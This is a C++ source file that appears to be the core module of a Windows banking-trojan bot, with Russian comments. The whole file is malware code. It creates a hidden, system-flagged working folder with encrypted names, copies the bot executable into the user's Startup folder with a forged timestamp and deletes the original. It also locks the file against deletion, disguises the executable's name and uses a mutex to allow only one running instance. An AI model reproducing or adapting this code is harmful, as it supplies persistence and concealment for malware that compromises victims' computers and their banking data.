//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"
#include "BotHosts.h"
#include "StrConsts.h"
//#include "DbgRpt.h"



//---------------------------------------------------------------------------

TBotApplication* Bot = NULL;

//---------------------------------------------------------------------------
#define MAX_BOT_WORK_FOLDER_LEN 15

// Рабочий каталог бота
char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};

DWORD BotWorkPathHash = 0;


// Максимальный размер массива шифрованного файла
#define MAX_CRYPTED_EXE_NAME_SIZE 50

// Оригинальное имя ехе файла бота
char OriginalBotExeName[] = {'W', 't', 'J', 'o', 'e', 'B', 't', '.', 'e', 'x', 'e',  0};

// Шифрованное имя исполняемого файла бота
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";

// Хэш имени бота
DWORD BotExeNameHash = 0;

//уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
//через функцию SetBankingMode()
char BOT_UID[128];


//****************************************************************************
//                              TBotApplication
//****************************************************************************

TBotApplication::TBotApplication()
{
	// Инициализируем глобальный объект
	Bot = this;


	// Инициализируем глобальные настройки бота
	FTerminated = false;

	// Определяем PID процесса
	FPID = GetUniquePID();

	// Определяем имя процесса в котором работает бот
	TMemory Buf(MAX_PATH);
	pGetModuleFileNameA(NULL, Buf.Buf(), MAX_PATH);
	FApplicationName = Buf.AsStr();

	// Генерируем рабочие пути
	FWorkPath = MakeWorkPath(false);

	// Получаем идентификатор бота
	FUID = GenerateBotID2();
}
//-------------------------------------------------------------


TBotApplication::~TBotApplication()
{

}
//-------------------------------------------------------------

DWORD TBotApplication::PID()
{
	// Функция возвращает идентификатор процесса в котором работает бот
	return FPID;
}
//-------------------------------------------------------------

string TBotApplication::UID()
{
	return FUID;
}
//-------------------------------------------------------------

bool TBotApplication::Terminated()
{
	// функция возвращает истину, если была получена команда
	// на прекращение работы
    return FTerminated;
}

//-------------------------------------------------------------

string TBotApplication::ApplicationName()
{
	// Имя приложения в котором работает бот
	return FApplicationName;
}
//-------------------------------------------------------------


string TBotApplication::WorkPath()
{
	// Путь к рабочему каталогу бота, привязан  к текущему пользователю
	return FWorkPath;
}
//-------------------------------------------------------------

string TBotApplication::MakePath(const char* SubDirectory)
{
	// Функция собирает путь с указанной поддиректорией
	// ВАЖНО:
	// Функция не поддерживает вложенные поддиректории.
	// ДЛя обеспечения уникальности, имя директории шифруется

	string Path = WorkPath();

	if (!STRA::IsEmpty(SubDirectory))
	{
		if (SubDirectory[0] == SlashChar)
			SubDirectory++;

		string Temp = SubDirectory;

		if (Temp[Temp.Length() - 1] == SlashChar)
			Temp[Temp.Length() - 1] = 0;

		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);

		Path += SD;
		Path += Slash;

		STR::Free(SD);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);
    }
	return Path;
}

string TBotApplication::MakePath(const string &SubDirectory)
{
	return MakePath(SubDirectory.t_str());
}
//-------------------------------------------------------------

string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
{
	string Name = MakeFileName(SubDir, FileName);
	File::WriteBufferA(Name.t_str(), NULL, 0);
	return Name;
}

string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
{
	return CreateFile(SubDir.t_str(), FileName);
}


//-------------------------------------------------------------

string TBotApplication::MakeFileName(const char* SubDir, const char* FileName)
{
	// Функция собирает имя файла в рабочей папке бота
	string Name = MakePath(SubDir);
	Name += FileName;
	return Name;
}

string TBotApplication::MakeFileName(const string &SubDir, const char* FileName)
{
	return MakeFileName(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
{
	// Функция проверяет наличие файла в рабочей папке бота
	string Name = MakeFileName(SubDir, FileName);
	return File::IsExists(Name.t_str());
}

bool TBotApplication::FileExists(const string &SubDir, const char* FileName)
{
	return FileExists(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

string TBotApplication::GrabberPath()
{
	// Путь к рабочему каталогу грабера данных
	if (FGrabberPath.IsEmpty())
		FGrabberPath = MakePath(GetStr(StrGrabberPath));
	return FGrabberPath;
}
//-------------------------------------------------------------

string TBotApplication::PrefixFileName()
{
	// Функция возвращает имя файла для хранения префикса
	if (FPerfixFileName.IsEmpty())
		FPerfixFileName = MakeFileName(NULL, GetStr(StrPrefixFileName).t_str());

	return FPerfixFileName;
}
//----------------------------------------------------------------------------


PCHAR TBotApplication::GetWorkFolder()
{
	// Функция возвращает рабочий каталог бота (короткое имя)

	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// Генерируем имя на основе константы обработанной ключём из уида
	string WorkPath = GetStr(StrBotWorkPath);

	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);

	// Копируем путь в глобальный массив
	const char *Buf = (Name) ? Name : WorkPath.t_str();

	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));

	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
	BOT_WORK_FOLDER_NAME[ToCopy] = 0;

	STR::Free(Name);

	// Расчитываем хэш
	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);

	return BOT_WORK_FOLDER_NAME;
}
//----------------------------------------------------------------------------
/*
string TBotApplication::MakeWorkPath(bool SystemPath)
{
	// Функция генерирует рабочий путь
	string Result;

	TMemory Path(MAX_PATH);
	if (!pSHGetSpecialFolderPathA(NULL, Path.Buf(), CSIDL_APPDATA, TRUE))
		return Result;

	if (SystemPath)
	{
		// Получаем путь в системной папке
		PCHAR Tmp = STRA::Scan(Path.AsStr(), ':');
		if (Tmp == NULL) return Result;
		Tmp++;
		*Tmp = 0;
	}

	Result = Path.AsStr();
	Result += "\\";
	Result += GetWorkFolder();
	Result += "\\";

	return Result;
}
//----------------------------------------------------------------------------
*/

string TBotApplication::MakeWorkPath(bool SystemPath)
{
	// Функция генерирует рабочий путь
	string Result;

	TMemory Path(MAX_PATH);
	if (!pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
		return Result;

	Result =  Path.AsStr();
	Result += GetWorkFolder();
	Result += "\\";

	if (!DirExists(Result.t_str()))
		pCreateDirectoryA(Result.t_str(), NULL);
	pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);


	return Result;
}
//----------------------------------------------------------------------------



void TBotApplication::SaveSettings()
{
	// Функция сохраняет базовые настройки

	// Сохраняем хосты
	PCHAR HostsName = Hosts::GetFileName();
	if (!FileExistsA(HostsName))
		SaveHostsToFile(HostsName);
	STR::Free(HostsName);

	// Сохраняем префикс
	string PrefixFile = PrefixFileName();
	if (!FileExistsA(PrefixFile.t_str()))
		SavePrefixToFile(PrefixFile.t_str());
}
//----------------------------------------------------------------------------

void TBotApplication::DeleteSettings()
{
	// Функция удаляет ранее сохранённые настройки
	// Удаляем хосты
	PCHAR HostsName = Hosts::GetFileName();
	pDeleteFileA(HostsName);
	STR::Free(HostsName);

	// Удаляем файл префикса
	pDeleteFileA(PrefixFileName().t_str());
}

//----------------------------------------------------------------------------




PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// Функция возвращает рабочий каталог бота

	string Path = Bot->WorkPath();

	if (Path.IsEmpty()) return NULL;

	// Добавляем подиректорию
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		Path += CryptDir;

		STR::Free(CryptDir);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);

    }

	PCHAR Result = STR::New(2, Path.t_str(), FileName);

	return  Result;
}
//----------------------------------------------------------------------------


void BOT::Initialize()
{
	// Функция инициализирует глобальные настройки бота

	// Инициализируем апи
	InitializeAPI();

	//Создаём глобальный объект бота
    Bot = new TBotApplication();

	// Создаём имя рабочей папки
	GetWorkFolderHash();

	GenerateUid(BOT_UID);

	// Включаем создание дампа при исключении
	// Пытаемся встать в начало списка, что дает нам возможность перехватить
	// ошибку до возможно установленных системных VEH.
	//InitialializeGlogalExceptionLogger(TRUE);
}

void BOT::InitializeApi()
{
	// Инициализируем апи
	InitializeAPI();
}

//----------------------------------------------------------------------------
PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  Функция возвращает рабочий путь бота
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
{
	//  Аналог функции GetWorkPath.
	//  Главное от личие от неё в том, что пусть
	//   создаётся в корне системного диска
    return BOTDoGetWorkPath(true, SubDir, FileName);
}
//----------------------------------------------------------------------------

DWORD BOT::GetWorkFolderHash()
{
	//  Функция возвращает хэш имени рабочей папки
	return BotWorkPathHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  Функция возвращает имя файла бота

	// При необходимости генерируем имя бота
	if (STR::IsEmpty(CryptedBotExeName))
	{
		PCHAR Name = UIDCrypt::CryptFileName(OriginalBotExeName, false);

		STR::Copy(Name, CryptedBotExeName, 0, StrCalcLength(Name) + 1);

		STR::Free(Name);

		// Расчитываем хэш имени

		BotExeNameHash = CalcHash(CryptedBotExeName);
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  Функция возвращает хэш имя файла бота
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotFullExeName()
{
	//  Функция возвращает полное имя файла бота

	PCHAR Path = STR::Alloc(MAX_PATH);

	// Получаем путь к папке автозагрузки
	pSHGetSpecialFolderPathA(NULL, Path, CSIDL_STARTUP, TRUE);

    PCHAR Name = STR::New(3, Path, "\\", GetBotExeName());

	STR::Free(Path);

    return Name;
}
//----------------------------------------------------------------------------

HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;

void BOT::Protect(PCHAR FileName)
{
	// Функция защищает ехе бота от удаления
	bool FreeName = STR::IsEmpty(FileName);

	if (FreeName)
		FileName = GetBotFullExeName();

	if (FileName == NULL)
    	return;

	// Открываем файл
	BotFileHandle = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(FileName, NULL, PAGE_READONLY, 0, 0, NULL );
	}

	if (FreeName)
		STR::Free(FileName);
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// Функция снимает защиту с ехе файла бота
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// Функция добавляет файл в автозагрузку

	if (!FileExistsA(FileName))
		return false;

	PCHAR BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile, false, 0))
	{
		STR::Free(BotFile);
		return 0;
    }

    // Снимаем системные атрибуты
	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_NORMAL);

	// Копируем файл
	bool Result = (BOOL)pCopyFileA(FileName, BotFile, TRUE) == TRUE;

	// Устанавливаем дату файла
	SetFakeFileDateTime(BotFile);

	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// Удаляем исходный файл
	if (Result)
		pDeleteFileA(FileName);


	STR::Free(BotFile);

	return Result;
}


//----------------------------------------------------
//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
//----------------------------------------------------
string BOT::BotExeMD5()
{
	PCHAR FileName = BOT::GetBotFullExeName();

	string Result = CalcFileMD5Hash2(FileName);

	if (Result.IsEmpty())
	{
		Result.SetLength(32);
		m_memset(Result.t_str(), '0', 32);
    }

	STR::Free(FileName);

	return Result;
}

//----------------------------------------------------
//  TryCreatBotInstance - функция возвращает 
//  хендл мьютекса, ненулевое значение которого означает
//  что этот экземпляр запущен первым.
//----------------------------------------------------
HANDLE BOT::TryCreateBotInstance()
{
	return TryCreateSingleInstance(GetStr(StrBotGlobalMutexName).t_str());
}


//----------------------------------------------------
//  IsRunning - Функция возвращает истину если в
//  системе уже запущен экземпляр бота
//----------------------------------------------------
bool BOT::IsRunning()
{
	HANDLE H = TryCreateBotInstance();
	bool Result = (H == 0);
	if (H) pCloseHandle(H);
	return Result;
}

